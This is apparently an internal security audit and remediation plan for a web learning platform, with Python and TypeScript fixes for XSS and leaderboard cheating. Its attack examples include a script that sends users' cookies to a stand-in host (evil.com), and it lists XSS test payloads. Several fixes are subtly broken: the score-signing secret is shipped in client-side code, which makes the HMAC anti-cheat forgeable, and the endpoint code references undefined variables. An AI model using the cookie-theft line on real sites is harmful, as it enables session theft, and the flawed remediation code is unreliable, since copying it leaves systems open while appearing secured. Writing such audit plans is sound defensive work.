# Security Audit & Remediation Plan

**Date**: 2025-12-12
**Priority**: 🔴 CRITICAL - Must fix before public launch
**Status**: 📋 Planning Phase

---

## 🚨 Critical Vulnerabilities Identified

### 1. XSS (Cross-Site Scripting) Vulnerabilities
**Severity**: 🔴 CRITICAL
**Risk**: Admin account compromise, user data theft, site defacement

**Affected Areas**:
- Blog post editor (HTML/Markdown)
- Course editor (descriptions, content)
- Tutorial editor (steps, code examples)
- Quiz editor (questions, answers)
- User profiles (bio, about)
- Comments (if enabled)

**Attack Vectors**:
```html
<!-- Malicious script injection -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- Event handler injection -->
<img src=x onerror="alert('XSS')" />
<div onClick="stealData()">Click me</div>

<!-- iframe injection -->
<iframe src="https://phishing-site.com"></iframe>

<!-- Inline JavaScript -->
<a href="javascript:void(maliciousCode())">Link</a>
```

### 2. Score/XP Manipulation Vulnerabilities
**Severity**: 🔴 CRITICAL
**Risk**: Leaderboard fraud, achievement abuse, unfair advantage

**Affected Systems**:
- Typing game scores
- Quiz XP rewards
- Course completion XP
- Tutorial completion XP
- User XP totals
- Leaderboard rankings
- Achievement unlocks

**Attack Vectors**:
- Direct API POST with forged scores
- Modified client-side JavaScript
- Replayed API requests with inflated values
- Man-in-the-middle score modification
- Race conditions in concurrent requests

---

## 📊 Vulnerability Assessment

### Phase 1: XSS Vulnerability Scan

We need to check EVERY place where user-generated content is:
1. Accepted (input)
2. Stored (database)
3. Displayed (output)

**Content Types to Audit**:
- [ ] Blog posts (title, content, excerpt)
- [ ] Courses (title, description, content)
- [ ] Tutorials (title, steps, code blocks)
- [ ] Quizzes (questions, answers, explanations)
- [ ] Comments (if enabled)
- [ ] User profiles (username, bio, about)
- [ ] Media uploads (alt text, captions)

**Rendering Methods to Check**:
- [ ] Markdown renderer (marked, react-markdown, etc.)
- [ ] HTML renderer (dangerouslySetInnerHTML usage)
- [ ] Rich text editor (TinyMCE, Quill, etc.)
- [ ] Code syntax highlighter (highlight.js, prism.js)
- [ ] LaTeX/Math renderer (KaTeX, MathJax)

### Phase 2: Score/XP Endpoint Audit

We need to identify ALL endpoints that:
1. Award XP/points
2. Update scores
3. Modify leaderboards
4. Grant achievements

**Endpoints to Audit**:
- [ ] `/api/v1/typing-game/submit-score`
- [ ] `/api/v1/quizzes/{id}/submit`
- [ ] `/api/v1/courses/{id}/complete`
- [ ] `/api/v1/tutorials/{id}/steps/{step}/complete`
- [ ] `/api/v1/users/{id}/xp` (if exists)
- [ ] `/api/v1/achievements/unlock`
- [ ] Any direct database XP updates

---

## 🛡️ Remediation Strategy

### Part 1: XSS Prevention (Content Sanitization)

#### Backend Sanitization (Defense in Depth)

**Install DOMPurify-like library for Python**:
```bash
pip install bleach  # HTML sanitizer
pip install markdown-safe  # Safe markdown parser
```

**Sanitization Rules**:
```python
# backend/app/core/sanitizer.py
import bleach
from typing import Optional

ALLOWED_TAGS = [
    'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td'
]

ALLOWED_ATTRIBUTES = {
    'a': ['href', 'title', 'target'],
    'img': ['src', 'alt', 'title', 'width', 'height'],
    'code': ['class'],  # For syntax highlighting
    'pre': ['class'],
}

ALLOWED_PROTOCOLS = ['http', 'https', 'mailto']

def sanitize_html(dirty_html: str) -> str:
    """Sanitize HTML content to prevent XSS"""
    if not dirty_html:
        return ""

    clean = bleach.clean(
        dirty_html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        protocols=ALLOWED_PROTOCOLS,
        strip=True  # Remove disallowed tags completely
    )

    return clean

def sanitize_markdown(dirty_md: str) -> str:
    """Convert markdown to safe HTML"""
    import markdown
    html = markdown.markdown(dirty_md, extensions=['extra', 'codehilite'])
    return sanitize_html(html)
```

**Apply to Models**:
```python
# backend/app/api/v1/services/blog/models.py
from app.core.sanitizer import sanitize_html

class BlogPost(Base):
    __tablename__ = "blog_posts"

    title = Column(String(200))
    content = Column(Text)  # Raw content (keep original)
    content_sanitized = Column(Text)  # Sanitized for display

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        if self.content:
            self.content_sanitized = sanitize_html(self.content)
```

#### Frontend Sanitization (Defense in Depth)

**Install DOMPurify**:
```bash
cd frontend
npm install dompurify
npm install @types/dompurify --save-dev
```

**Create Sanitizer Hook**:
```typescript
// frontend/src/hooks/useSanitize.ts
import DOMPurify from 'dompurify';

export const useSanitize = () => {
  const sanitizeHTML = (dirty: string): string => {
    return DOMPurify.sanitize(dirty, {
      ALLOWED_TAGS: [
        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'a', 'img',
        'table', 'thead', 'tbody', 'tr', 'th', 'td'
      ],
      ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'target'],
      ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
    });
  };

  return { sanitizeHTML };
};
```

**Safe Rendering Component**:
```typescript
// frontend/src/components/SafeHTML.tsx
import React from 'react';
import DOMPurify from 'dompurify';

interface SafeHTMLProps {
  html: string;
  className?: string;
}

export const SafeHTML: React.FC<SafeHTMLProps> = ({ html, className }) => {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'a', 'img'
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
  });

  return <div className={className} dangerouslySetInnerHTML={{ __html: sanitized }} />;
};
```

**Replace ALL dangerouslySetInnerHTML usage**:
```typescript
// BEFORE (VULNERABLE):
<div dangerouslySetInnerHTML={{ __html: post.content }} />

// AFTER (SAFE):
<SafeHTML html={post.content} className="prose dark:prose-invert" />
```

---

### Part 2: Score/XP Validation (Server-Side)

#### Anti-Cheat System Architecture

**1. Request Signature/HMAC**:
```python
# backend/app/core/score_validator.py
import hmac
import hashlib
from datetime import datetime, timedelta
from typing import Dict, Any

SECRET_KEY = settings.SCORE_VALIDATION_SECRET  # 32+ char random string

def generate_score_token(user_id: int, game_type: str, timestamp: int) -> str:
    """Generate HMAC token for score submission"""
    message = f"{user_id}:{game_type}:{timestamp}"
    return hmac.new(
        SECRET_KEY.encode(),
        message.encode(),
        hashlib.sha256
    ).hexdigest()

def validate_score_token(user_id: int, game_type: str, timestamp: int, token: str) -> bool:
    """Validate score submission token"""
    # Check timestamp (prevent replay attacks)
    now = int(datetime.utcnow().timestamp())
    if abs(now - timestamp) > 300:  # 5 minute window
        return False

    expected_token = generate_score_token(user_id, game_type, timestamp)
    return hmac.compare_digest(expected_token, token)
```

**2. Server-Side Score Validation**:
```python
# backend/app/api/v1/endpoints/typing_game.py
from app.core.score_validator import validate_score_token, validate_typing_metrics

@router.post("/typing-game/submit-score")
async def submit_typing_score(
    score_data: TypingScoreSubmission,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Submit typing game score with anti-cheat validation"""

    # 1. Validate request signature
    if not validate_score_token(
        current_user.id,
        "typing",
        score_data.timestamp,
        score_data.token
    ):
        raise HTTPException(403, "Invalid score token")

    # 2. Validate metrics (server-side checks)
    validation = validate_typing_metrics(score_data)
    if not validation.is_valid:
        logger.warning(
            f"Suspicious typing score from user {current_user.id}: {validation.reason}"
        )
        # Flag for review but don't reject (false positives)
        score_data.flagged_for_review = True
        score_data.anti_cheat_flags = validation.flags

    # 3. Rate limiting (prevent spam)
    recent_submissions = db.query(TypingGameSession).filter(
        TypingGameSession.user_id == current_user.id,
        TypingGameSession.created_at > datetime.utcnow() - timedelta(minutes=1)
    ).count()

    if recent_submissions > 5:
        raise HTTPException(429, "Too many score submissions")

    # 4. Save score
    session = TypingGameSession(
        user_id=current_user.id,
        wpm=score_data.wpm,
        accuracy=score_data.accuracy,
        duration=score_data.duration,
        anti_cheat_confidence=validation.confidence,
        flagged_for_review=score_data.flagged_for_review
    )
    db.add(session)
    db.commit()

    # 5. Award XP (only if not flagged)
    if not score_data.flagged_for_review:
        xp_awarded = calculate_typing_xp(score_data.wpm, score_data.accuracy)
        xp_service.award_xp(db, current_user.id, xp_awarded, "typing_game")

    return {"success": True, "xp_awarded": xp_awarded if not flagged else 0}
```

**3. Metric Validation Rules**:
```python
# backend/app/core/anti_cheat.py
from dataclasses import dataclass
from typing import List

@dataclass
class ValidationResult:
    is_valid: bool
    confidence: float  # 0.0 to 1.0
    flags: List[str]
    reason: str

def validate_typing_metrics(data: TypingScoreSubmission) -> ValidationResult:
    """Validate typing game metrics for cheating"""
    flags = []
    confidence = 1.0

    # Rule 1: Physically impossible WPM
    if data.wpm > 250:  # World record is ~216 WPM
        flags.append("impossible_wpm")
        confidence -= 0.5

    # Rule 2: Suspiciously high accuracy + speed
    if data.wpm > 150 and data.accuracy > 99:
        flags.append("suspicious_accuracy")
        confidence -= 0.3

    # Rule 3: Duration vs word count mismatch
    expected_duration = (data.word_count / data.wpm) * 60
    if abs(data.duration - expected_duration) > 10:
        flags.append("duration_mismatch")
        confidence -= 0.2

    # Rule 4: Too many perfect runs in a row
    # (Check user's history in database)

    # Rule 5: Keystroke pattern analysis
    # (If we track keystroke timing)

    is_valid = confidence > 0.5
    reason = ", ".join(flags) if flags else "Valid"

    return ValidationResult(is_valid, confidence, flags, reason)
```

**4. Frontend Token Generation**:
```typescript
// frontend/src/services/scoreSubmission.ts
import CryptoJS from 'crypto-js';

const SECRET_KEY = process.env.VITE_SCORE_SECRET; // Shared secret

export const generateScoreToken = (
  userId: number,
  gameType: string,
  timestamp: number
): string => {
  const message = `${userId}:${gameType}:${timestamp}`;
  return CryptoJS.HmacSHA256(message, SECRET_KEY).toString();
};

export const submitTypingScore = async (
  wpm: number,
  accuracy: number,
  duration: number,
  wordCount: number
) => {
  const timestamp = Math.floor(Date.now() / 1000);
  const token = generateScoreToken(userId, 'typing', timestamp);

  const response = await fetch('/api/v1/typing-game/submit-score', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
      wpm,
      accuracy,
      duration,
      wordCount,
      timestamp,
      token
    })
  });

  return response.json();
};
```

---

## 🔍 Implementation Checklist

### XSS Prevention Tasks

**Backend**:
- [ ] Install bleach library
- [ ] Create `app/core/sanitizer.py`
- [ ] Add sanitization to Blog models
- [ ] Add sanitization to Course models
- [ ] Add sanitization to Tutorial models
- [ ] Add sanitization to Quiz models
- [ ] Add sanitization to User profile models
- [ ] Add sanitization to Comment models (if enabled)
- [ ] Test sanitization with malicious payloads
- [ ] Add unit tests for sanitizer

**Frontend**:
- [ ] Install DOMPurify
- [ ] Create `SafeHTML` component
- [ ] Create `useSanitize` hook
- [ ] Find ALL `dangerouslySetInnerHTML` usage
- [ ] Replace with `SafeHTML` component
- [ ] Test with XSS payloads
- [ ] Add CSP (Content Security Policy) headers

### Score Validation Tasks

**Backend**:
- [ ] Create `app/core/score_validator.py`
- [ ] Create `app/core/anti_cheat.py`
- [ ] Add SECRET_KEY to .env
- [ ] Update typing game endpoint with validation
- [ ] Update quiz submission endpoint
- [ ] Update course completion endpoint
- [ ] Update tutorial completion endpoint
- [ ] Add rate limiting to score endpoints
- [ ] Add admin dashboard for flagged scores
- [ ] Add unit tests for validation logic

**Frontend**:
- [ ] Install crypto-js (or use Web Crypto API)
- [ ] Create score submission service
- [ ] Update typing game to use signed requests
- [ ] Update quiz to use signed requests
- [ ] Handle validation errors gracefully
- [ ] Add user-friendly error messages

---

## 📅 Implementation Timeline

### Week 1: XSS Prevention
**Days 1-2**: Backend sanitization
- Install libraries
- Create sanitizer module
- Apply to Blog/Course models
- Test and validate

**Days 3-4**: Frontend sanitization
- Install DOMPurify
- Create SafeHTML component
- Audit and replace all dangerous HTML rendering
- Test with XSS payloads

**Day 5**: Testing & Validation
- Penetration testing
- Code review
- Fix any issues found

### Week 2: Score/XP Validation
**Days 1-2**: Anti-cheat infrastructure
- Create validation module
- Implement HMAC token system
- Add metric validation rules

**Days 3-4**: Endpoint hardening
- Update typing game endpoint
- Update quiz endpoints
- Add rate limiting
- Test validation

**Day 5**: Admin tools & monitoring
- Create flagged scores dashboard
- Add logging and alerts
- Final testing

---

## 🧪 Testing Strategy

### XSS Testing Payloads

Test these in ALL content fields:
```html
<!-- Basic script injection -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror="alert('XSS')">
<div onclick="alert('XSS')">Click</div>

<!-- iframe embedding -->
<iframe src="javascript:alert('XSS')"></iframe>

<!-- Link injection -->
<a href="javascript:alert('XSS')">Click</a>

<!-- SVG injection -->
<svg onload="alert('XSS')"></svg>

<!-- Style injection -->
<style>body{background:url('javascript:alert(1)')}</style>

<!-- Base64 encoded -->
<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### Score Validation Testing

```python
# Test cases for score validation
test_cases = [
    {
        "name": "Impossible WPM",
        "wpm": 500,
        "accuracy": 95,
        "should_flag": True
    },
    {
        "name": "Suspicious accuracy",
        "wpm": 180,
        "accuracy": 100,
        "should_flag": True
    },
    {
        "name": "Duration mismatch",
        "wpm": 100,
        "duration": 10,  # Too short
        "word_count": 500,
        "should_flag": True
    },
    {
        "name": "Valid score",
        "wpm": 80,
        "accuracy": 95,
        "duration": 60,
        "word_count": 80,
        "should_flag": False
    }
]
```

---

## 📝 Next Steps

1. **Review this plan** with your team
2. **Prioritize vulnerabilities** (XSS first, then scores)
3. **Allocate resources** (developer time, testing)
4. **Start with XSS prevention** (highest risk)
5. **Deploy fixes incrementally** (one system at a time)
6. **Monitor logs** for attack attempts
7. **Document all changes**

---

**Created**: 2025-12-12
**Priority**: 🔴 CRITICAL
**Estimated Time**: 2 weeks full-time
**Status**: Ready to begin implementation
